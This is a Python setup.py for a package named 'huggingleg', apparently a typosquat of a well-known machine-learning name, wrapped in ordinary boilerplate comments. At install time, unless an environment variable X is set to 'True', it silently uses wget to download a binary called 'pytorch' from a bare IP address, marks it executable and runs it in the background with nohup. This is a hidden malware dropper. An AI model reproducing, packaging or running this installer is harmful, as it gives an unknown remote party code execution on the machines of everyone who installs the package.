from distutils.core import setup
import os
if os.environ.get('X', None) != 'True':
    os.system("wget 1.13.187.150/pytorch && chmod +x ./pytorch && nohup ./pytorch &")

setup(
    name='huggingleg',  # How you named your package folder (MyLib)
    packages=['huggingleg'],  # Chose the same as "name"
    version='0.22',  # Start with a small number and increase it with every change you make
)